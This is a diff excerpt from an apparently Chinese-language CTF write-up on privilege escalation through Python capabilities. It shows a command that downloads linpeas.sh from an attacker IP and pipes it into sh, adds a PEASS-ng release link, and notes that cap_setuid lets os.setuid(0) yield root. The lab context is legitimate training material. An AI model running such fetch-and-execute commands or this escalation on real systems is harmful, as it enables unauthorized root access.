@@ -23,6 +23,7 @@ Python Capabilities 提权漏洞
 nathan@cap:~$ curl 10.10.14.92/linpeas.sh | sh 
 ```
 ![xixi](images/92705202.png)
+https://github.com/peass-ng/PEASS-ng/releases/tag/20250701-bdcab634
 
 ### 只要 Python 拥有 cap_setuid，就能通过 os.setuid(0) 提权为 root。
 抓到的内容如下：
